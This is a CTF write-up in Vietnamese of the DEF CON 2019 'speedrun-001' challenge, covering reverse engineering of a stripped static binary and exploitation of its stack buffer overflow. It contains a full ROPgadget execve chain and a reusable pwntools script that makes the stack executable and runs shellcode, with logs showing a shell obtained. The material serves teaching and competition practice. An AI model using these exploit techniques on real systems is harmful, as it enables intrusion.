# speedrun-001
```
The Fast and the Furious

For all speedrun challenges, flag is in /flag

https://s3.us-east-2.amazonaws.com/oooverflow-challs/c3174710ab5f90f46fdf555ae346b6a40fc647ef6aa51d05c2b19379d4c06048/speedrun-001

speedrun-001.quals2019.oooverflow.io 31337
```
# Mở bài
Qua các bài speedrun của defcon mình mới thấy cần cải thiện tốc độ exploit lên hơn nữa.
Sau đây là writeup bài speedrun-001

# Thân bài

## Các bước kiểm tra cơ bản
```
$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
```
```
$ checksec ./speedrun-001
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```

Những điểm đáng chú ý:
* **ELF 64-bit**
* **statically linked** (nôm na là binary bao gồm cả code và thư viện luôn, binary có thể chạy độc lập mà không dùng tới bất kì binary nào trong hệ thống chẳng hạn như libc)
* **stripped** (các symbol như tên hàm, tên biến bị loại bỏ khiến cho việc debug khó khăn hơn)
* **No canary found** (Không có canary thì nếu gặp stack overflow sẽ dễ dàng hơn)
* **NX enabled** (Không có quyền thực thi trên stack và data, bss)
* **No PIE** (Không random địa chỉ của binary)

## Tìm lỗi
Đầu tiên ta cần tìm hàm **main**

So sánh start của binary với 1 binary khác không bị strip symbol

Không bị strip:
```
.text:0000555555554960                 public start
.text:0000555555554960 start           proc near
.text:0000555555554960 ; __unwind {
.text:0000555555554960                 xor     ebp, ebp
.text:0000555555554962                 mov     r9, rdx         ; rtld_fini
.text:0000555555554965                 pop     rsi             ; argc
.text:0000555555554966                 mov     rdx, rsp        ; ubp_av
.text:0000555555554969                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:000055555555496D                 push    rax
.text:000055555555496E                 push    rsp             ; stack_end
.text:000055555555496F                 lea     r8, fini        ; fini
.text:0000555555554976                 lea     rcx, init       ; init
.text:000055555555497D                 lea     rdi, main       ; main
.text:0000555555554984                 call    cs:__libc_start_main_ptr
.text:000055555555498A                 hlt
.text:000055555555498A ; } // starts at 555555554960
.text:000055555555498A start           endp
```
Strip:
```
.text:0000000000400A30                 public start
.text:0000000000400A30 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:0000000000400A30 ; __unwind {
.text:0000000000400A30                 xor     ebp, ebp
.text:0000000000400A32                 mov     r9, rdx
.text:0000000000400A35                 pop     rsi
.text:0000000000400A36                 mov     rdx, rsp
.text:0000000000400A39                 and     rsp, 0FFFFFFFFFFFFFFF0h
.text:0000000000400A3D                 push    rax
.text:0000000000400A3E                 push    rsp
.text:0000000000400A3F                 mov     r8, offset sub_4019A0
.text:0000000000400A46                 mov     rcx, offset loc_401900
.text:0000000000400A4D                 mov     rdi, offset sub_400BC1
.text:0000000000400A54                 db      67h
.text:0000000000400A54                 call    sub_400EA0
.text:0000000000400A54 start           endp
```

=> **sub_400BC1** là hàm main của chương trình.

Tiếp tục xem xét trong hàm main ta thấy đoạn này:
```
.text:0000000000400BD0                 mov     rax, cs:off_6B97A0
.text:0000000000400BD7                 mov     ecx, 0
.text:0000000000400BDC                 mov     edx, 2
.text:0000000000400BE1                 mov     esi, 0
.text:0000000000400BE6                 mov     rdi, rax
.text:0000000000400BE9                 call    sub_410590
```
Vậy hàm **sub_410590** là hàm gì? Biến **cs:off_6B97A0** là biến gì?

*sub_410590(cs:off_6B97A0, 0, 2, 0)* :thinking_face:

Dựa vào kinh nghiệm chơi CTF của mình có thể đoán ngay hàm này là **setvbuf** với 3 tham số **0, 2, 0** không lẫn vào đâu được.

Vậy còn **cs:off_6B97A0**? Nó có thể là stdin, stdout, stderr. Không quá quan trọng nên ta tiếp tục phần sau.

```
.text:0000000000400BEE                 lea     rdi, aDebug     ; "DEBUG"
.text:0000000000400BF5                 call    sub_40E790
```
Tiếp tục ngoại cảm thì ta sẽ đoán được luôn nó là **getenv**, còn muốn đi sâu hơn cũng được nhưng mất thời gian.

```
.text:0000000000400BFF                 mov     edi, 5
.text:0000000000400C04                 call    sub_449040
```
```
.text:0000000000449040 sub_449040      proc near               ; CODE XREF: main+43↑p
.text:0000000000449040 ; __unwind {
.text:0000000000449040                 mov     eax, 25h
.text:0000000000449045                 syscall                 ; LINUX - sys_alarm
.text:0000000000449047                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:000000000044904D                 jnb     short loc_449050
.text:000000000044904F                 retn
.text:0000000000449050 ; ---------------------------------------------------------------------------
.text:0000000000449050
.text:0000000000449050 loc_449050:                             ; CODE XREF: sub_449040+D↑j
.text:0000000000449050                 mov     rcx, 0FFFFFFFFFFFFFFC0h
.text:0000000000449057                 neg     eax
.text:0000000000449059                 mov     fs:[rcx], eax
.text:000000000044905C                 or      rax, 0FFFFFFFFFFFFFFFFh
.text:0000000000449060                 retn
.text:0000000000449060 ; } // starts at 449040
.text:0000000000449060 sub_449040      endp
```
**LINUX - sys_alarm** => **sub_449040** chắc chắn là hàm **alarm**

```
.text:0000000000400C09                 mov     eax, 0
.text:0000000000400C0E                 call    sub_400B4D
```
```
.text:0000000000400B4D sub_400B4D      proc near               ; CODE XREF: main+4D↓p
.text:0000000000400B4D ; __unwind {
.text:0000000000400B4D                 push    rbp
.text:0000000000400B4E                 mov     rbp, rsp
.text:0000000000400B51                 lea     rdi, aHelloBraveNewC ; "Hello brave new challenger"
.text:0000000000400B58                 call    sub_410390
.text:0000000000400B5D                 nop
.text:0000000000400B5E                 pop     rbp
.text:0000000000400B5F                 retn
.text:0000000000400B5F ; } // starts at 400B4D
.text:0000000000400B5F sub_400B4D      endp
```

Lại dựa vào ngoại cảm thì ta đoán được **sub_410390** là hàm **printf** hoặc **puts**, theo kinh nghiệm thì ta chọn nó là hàm **puts**

Debug thử
```
$ ./speedrun-001 
Hello brave new challenger
Any last words?
[1]    4942 alarm      ./speedrun-001
```
```
.rodata:0000000000492528 aHelloBraveNewC db 'Hello brave new challenger',0
```
Ta thấy dòng **Hello brave new challenger** sau khi qua hàm **sub_410390** thì nó in thêm xuống dòng => **sub_410390** = **puts**

Gán đại hàm **sub_400B4D** thành **say_hello** vì chỉ mỗi nhiệm vụ **puts** dòng chữ **Hello brave new challenger**

```
.text:0000000000400C13                 mov     eax, 0
.text:0000000000400C18                 call    sub_400B60
```
```
.text:0000000000400B60 sub_400B60      proc near               ; CODE XREF: main+57↓p
.text:0000000000400B60
.text:0000000000400B60 buf             = byte ptr -400h
.text:0000000000400B60
.text:0000000000400B60 ; __unwind {
.text:0000000000400B60                 push    rbp
.text:0000000000400B61                 mov     rbp, rsp
.text:0000000000400B64                 sub     rsp, 400h
.text:0000000000400B6B                 lea     rdi, aAnyLastWords ; "Any last words?"
.text:0000000000400B72                 call    puts
.text:0000000000400B77                 lea     rax, [rbp+buf]
.text:0000000000400B7E                 mov     edx, 7D0h       ; count
.text:0000000000400B83                 mov     rsi, rax        ; buf
.text:0000000000400B86                 mov     edi, 0          ; fd
.text:0000000000400B8B                 call    sub_4498A0
.text:0000000000400B90                 lea     rax, [rbp+buf]
.text:0000000000400B97                 mov     rsi, rax
.text:0000000000400B9A                 lea     rdi, aThisWillBeTheL ; "This will be the last thing that you sa"...
.text:0000000000400BA1                 mov     eax, 0
.text:0000000000400BA6                 call    sub_40F710
.text:0000000000400BAB                 nop
.text:0000000000400BAC                 leave
.text:0000000000400BAD                 retn
.text:0000000000400BAD ; } // starts at 400B60
.text:0000000000400BAD sub_400B60      endp
```

**sub_4498A0(fd, buf, count)** ? 1000% nó là ***read(fd, buf, count)** vì khi debug ta thấy nó chờ nhập.

Mà **buf** nằm tại **rbp-0x400** trong khi read hẳn **0x7D0** :o

Vậy chương trình bị lỗi **stack buffer overflow**.

**sub_40F710("This will be the last thing that you say: %s\n",buf)** => 1000% **sub_40F710** là **printf**

Phần sau nữa ta không cần quan tâm vì khai thác stack buffer overflow cũng đủ rồi.

## Khai thác
Đối với thể loại **statically linked** thì ta có thể khai thác theo 2 hướng:
* ropchain
* Gọi **_dl_make_stack_executable** rồi gọi tới gadget **call rsp** để thực thi shellcode trên buf

Với ropchain ta cần lượng payload khá dài nên phù hợp với những bài cho input buf nhiều.
Với _dl_make_stack_executable thì lượng buf không cần dài nhưng ta cần tìm ra các symbols: **__stack_prot**, **__libc_stack_end**, **_dl_make_stack_executable**.
Giờ ta thử tiếp cận theo 2 hướng:
### ropchain
Ta sử dụng [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) để tạo ropchain.
```
$ python ~/ROPgadget/ROPgadget.py --binary ./speedrun-001 --ropchain
...
- Step 5 -- Build the ROP chain

       #!/usr/bin/env python2
       # execve generated by ROPgadget

       from struct import pack

       # Padding goes here
       p = ''

       p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
       p += pack('<Q', 0x00000000006b90e0) # @ .data
       p += pack('<Q', 0x0000000000415664) # pop rax ; ret
       p += '/bin//sh'
       p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
       p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
       p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
       p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
       p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
       p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
       p += pack('<Q', 0x00000000006b90e0) # @ .data
       p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
       p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
       p += pack('<Q', 0x00000000004498b5) # pop rdx ; ret
       p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
       p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
       p += pack('<Q', 0x000000000040129c) # syscall
```
Thấy dài chưa?
Vậy giờ ta chỉ cần send **("A"0x408 + p)** là xong bài.
```
$ python speedrun-001.py 1
[*] '/home/phieulang/ctf/2019/defcon/speedrun/speedrun-001'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for './speedrun-001'
[+] Starting local process './speedrun-001': pid 5545
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB�A
$                          whoami
phieulang
```
Khá nhanh đó nhưng ta phải chạy command Ropgadget để tạo ropchain rồi copy vào script exploit (bạn nào làm rảnh thì có thể viết script cho nó tạo tự động rồi share mình với).

### _dl_make_stack_executable
Hàm **_dl_make_stack_executable** làm gì? Như cái tên của nó là làm cho stack có thể thực thi (execute) được.
```
.text:000000000047FD40 ; unsigned int __fastcall dl_make_stack_executable(_QWORD *stack_endp)
.text:000000000047FD40 _dl_make_stack_executable proc near     ; CODE XREF: sub_476B20+E9F↑p
.text:000000000047FD40                                         ; DATA XREF: .data:off_6BA218↓o
.text:000000000047FD40 ; __unwind {
.text:000000000047FD40                 mov     rsi, cs:_dl_pagesize
.text:000000000047FD47                 push    rbx
.text:000000000047FD48                 mov     rbx, rdi
.text:000000000047FD4B                 mov     rdx, [rdi]
.text:000000000047FD4E                 mov     rdi, rsi
.text:000000000047FD51                 neg     rdi
.text:000000000047FD54                 and     rdi, rdx
.text:000000000047FD57                 cmp     rdx, cs:__libc_stack_end
.text:000000000047FD5E                 jnz     short loc_47FD80
.text:000000000047FD60                 mov     edx, cs:stack_prot
.text:000000000047FD66                 call    mprotect
.text:000000000047FD6B                 test    eax, eax
.text:000000000047FD6D                 jnz     short loc_47FD90
.text:000000000047FD6F                 mov     qword ptr [rbx], 0
.text:000000000047FD76                 or      cs:dword_6BA1E8, 1
.text:000000000047FD7D                 pop     rbx
.text:000000000047FD7E                 retn
.text:000000000047FD7E ; ---------------------------------------------------------------------------
.text:000000000047FD7F                 align 20h
.text:000000000047FD80
.text:000000000047FD80 loc_47FD80:                             ; CODE XREF: _dl_make_stack_executable+1E↑j
.text:000000000047FD80                 mov     eax, 1
.text:000000000047FD85                 pop     rbx
.text:000000000047FD86                 retn
```
Hàm _dl_make_stack_executable sẽ lấy tham số đầu vào là **stack_endp** so sánh với **cs:__libc_stack_end** nếu khác thì return 1, nếu bằng thì tiếp tục.

Hàm mprotect với các tham số **mprotect(*stack_endp & -cs:_dl_pagesize, cs:_dl_pagesize, cs:stack_prot)** với **cs:_dl_pagesize**
```
.data:00000000006BA1F8 _dl_pagesize    dq 1000h
```

Như vậy ta cần control **cs:stack_prot** thành **0x7 (PROT_READ | PROT_WRITE | PROT_EXEC)**  <https://unix.superglobalmegacorp.com/Net2/newsrc/sys/mman.h.html>

Debug:
```
 ► 0x44a685    syscall  <SYS_mprotect>
        addr: 0x7ffeeeada000 ◂— 0x0
        len: 0x1000
        prot: 0x7
```

Cách này sài chung được cho nhiều bài **statically linked** vì payload nó ngắn hơn so với ropchain.
Quan trọng là bài này bị strip symbols vì vậy ta cần cách nào đó để tìm được các symbol cần thiết nhanh nhất có thể.
Như đã đề cập ở writeup [sandbox kỳ tetctf](https://github.com/phieulang1993/ctf-writeups/tree/master/2019/tetctf.cf/sandbox) giờ mình sử dụng pwntools kết hợp với 1 số công cụ khác để tìm tự động:
Trước hết ta tìm **__stack_prot**:
```
def find_stack_prot():
	data_rel_ro = elf.get_section_by_name(".data.rel.ro").header
	data_rel_ro_sh_addr = data_rel_ro.sh_addr
	data_rel_ro_sh_size = data_rel_ro.sh_size
	__stack_prot = data_rel_ro_sh_addr+data_rel_ro_sh_size-4
	return __stack_prot
```
Y như trong writeup sandbox luôn nhé!

Tiếp theo ta tìm **_dl_make_stack_executable**:
Vì **_dl_make_stack_executable** có sử dụng tới **__stack_prot** nên ta cần tìm các hàm xref tới **__stack_prot** là có thể tìm được **_dl_make_stack_executable**
```
def find_dl_make_stack_executable(__stack_prot):
	xref_result = xref(hex(__stack_prot)[2:])[1]
	return int(xref_result.split(" ")[0],16)-32
```
Để tìm xref thì ta làm sao? Mình học theo cách của [**peda**](https://github.com/longld/peda/blob/master/peda.py#L876) (cảm ơn anh longld) là sử dụng **objdump**
```
def xref(search):
	data = os.popen('objdump -M intel -z --prefix-address -d "speedrun-001" | grep "%s"' % search).read().strip().splitlines()
	return data
```

Có 2 hàm xref tới **__stack_prot** nhưng ta có thể xác định là hàm thứ 2 là hàm **_dl_make_stack_executable** (Đã thử trên nhiều binary static và thành công)
```
.text:000000000047FD40 _dl_make_stack_executable proc near     ; CODE XREF: sub_476B20+E9F↑p
.text:000000000047FD40                                         ; DATA XREF: .data:off_6BA218↓o
.text:000000000047FD40 ; __unwind {
.text:000000000047FD40                 mov     rsi, cs:qword_6BA1F8
.text:000000000047FD47                 push    rbx
.text:000000000047FD48                 mov     rbx, rdi
.text:000000000047FD4B                 mov     rdx, [rdi]
.text:000000000047FD4E                 mov     rdi, rsi
.text:000000000047FD51                 neg     rdi
.text:000000000047FD54                 and     rdi, rdx
.text:000000000047FD57                 cmp     rdx, cs:__libc_stack_end
.text:000000000047FD5E                 jnz     short loc_47FD80
.text:000000000047FD60                 mov     edx, cs:stack_prot
.text:000000000047FD66                 call    sub_44A680
.text:000000000047FD6B                 test    eax, eax
.text:000000000047FD6D                 jnz     short loc_47FD90
.text:000000000047FD6F                 mov     qword ptr [rbx], 0
.text:000000000047FD76                 or      cs:dword_6BA1E8, 1
.text:000000000047FD7D                 pop     rbx
.text:000000000047FD7E                 retn
.text:000000000047FD7E ; ---------------------------------------------------------------------------
.text:000000000047FD7F                 align 20h
.text:000000000047FD80
.text:000000000047FD80 loc_47FD80:                             ; CODE XREF: _dl_make_stack_executable+1E↑j
.text:000000000047FD80                 mov     eax, 1
.text:000000000047FD85                 pop     rbx
.text:000000000047FD86                 retn
```
Từ vị trí sử dụng **__stack_prot** tới đầu hàm **_dl_make_stack_executable** là **0x47FD60 - 0x47FD40 = 32 bytes**

Tiếp theo ta tìm **__libc_stack_end**:
Từ vị trí đầu hàm **_dl_make_stack_executable** tới vị trí sử dụng **__libc_stack_end** là **0x47FD57 - 0x47FD40 = 23 bytes**
```
def find__libc_stack_end(_dl_make_stack_executable):
	xref_result = xref(hex(_dl_make_stack_executable+23)[2:])[0].split("# ")[1]
	return int(xref_result.split(" ")[0],16)
```
Okay vậy ta đã tìm xong các symbols cần thiết.
Tiếp theo ta tìm các gadget:
```
binname = './speedrun-001'
elf = ELF(binname)
rop = ROP(elf)
def find_gadget(gadget):
	gadgets = gadget.split(" ; ")
	found = rop.find_gadget(gadgets)
	if found == None:
		if sum(1 for _ in elf.search(asm(gadget)))==0:
			return None
		return next(elf.search(asm(gadget)))
	else:
		return rop.find_gadget(gadgets).address
```
Mình sử dụng hàm rop.find_gadget, nếu không có thì sử dụng elf.search.

Đây là các gadget cần thiết:
```
pop_rax_rdx_rbx = find_gadget('pop rax ; pop rdx ; pop rbx ; ret')
mov_dword_rdx_rax = find_gadget('mov dword ptr [rdx], eax ; ret')
pop_rdi = find_gadget('pop rdi ; ret')
call_rsp = find_gadget('call rsp')
```

Shellcode thì mình sử dụng shellcode [pwnlib.shellcraft.amd64.linux.sh()](http://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.sh)
Việc tiếp theo là kết hợp các symbols, gadgets và shellcode lại với nhau để tạo thành rop phù hợp:
```
def exploit_stack_overflow_static_binary(buffsize):
	pop_rax_rdx_rbx = find_gadget('pop rax ; pop rdx ; pop rbx ; ret')
	mov_dword_rdx_rax = find_gadget('mov dword ptr [rdx], eax ; ret')
	pop_rdi = find_gadget('pop rdi ; ret')
	call_rsp = find_gadget('call rsp')
	
	__stack_prot = find_stack_prot()
	_dl_make_stack_executable = find_dl_make_stack_executable(__stack_prot)
	__libc_stack_end = find__libc_stack_end(_dl_make_stack_executable)
	
	log.info("_dl_make_stack_executable: %#x" % _dl_make_stack_executable)
	log.info("__stack_prot: %#x" % __stack_prot)
	log.info("__libc_stack_end: %#x" % __libc_stack_end)
	log.info("pop_rax_rdx_rbx: %#x" % pop_rax_rdx_rbx)
	log.info("mov_dword_rdx_rax: %#x" % mov_dword_rdx_rax)
	log.info("pop_rdi: %#x" % pop_rdi)
	log.info("call_rsp: %#x" % call_rsp)
	shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
	payload = "A"*buffsize
	payload += "B"*8 # rbp
	payload += p64(pop_rax_rdx_rbx)
	payload += p64(7) # rax
	payload += p64(__stack_prot) # rdx
	payload += p64(0) # rbx
	payload += p64(mov_dword_rdx_rax) # __stack_prot = 7
	payload += p64(pop_rdi)
	payload += p64(__libc_stack_end)
	payload += p64(_dl_make_stack_executable)
	payload += p64(call_rsp)
	payload += shellcode
	r.send(payload)
	
exploit_stack_overflow_static_binary(buffsize=0x400)
```

```
$ python speedrun-001.py 1
[*] '/home/phieulang/ctf/2019/defcon/speedrun/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded cached gadgets for './speedrun-001'
[+] Starting local process './speedrun-001': pid 5697
[*] _dl_make_stack_executable: 0x47fd40
[*] __stack_prot: 0x6b8ef0
[*] __libc_stack_end: 0x6b8ab0
[*] pop_rax_rdx_rbx: 0x481c76
[*] mov_dword_rdx_rax: 0x418398
[*] pop_rdi: 0x400686
[*] call_rsp: 0x44a791
[*] Switching to interactive mode
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBv\x1cH
$ whoami
phieulang
```

# Kết luận
Vậy sao này gặp các bài khác tương tự ta cần làm sao? Ta chỉ việc sửa buffsize cho hàm **exploit_stack_overflow_static_binary** là đã có thể khai thác được (nếu bài cho buf đủ hoặc nhiều hơn payload).

Trường hợp buf ngắn hơn thì ta cần phải optimaze lại payload tùy theo context của các thanh ghi, stack hiện có.

Với mỗi bài dù dễ hay khó ta nên viết lại script theo hướng tự động nhiều nhất và phù hợp với nhiều trường hợp nhất có thể để sau này vươn ra biển lớn còn đuổi theo các bạn khác. Chứ mấy lần mình đi thi cuộc thi quốc tế chưa kịp đọc đề thì đội bạn đã giải ra flag mất rồi :facepalm:
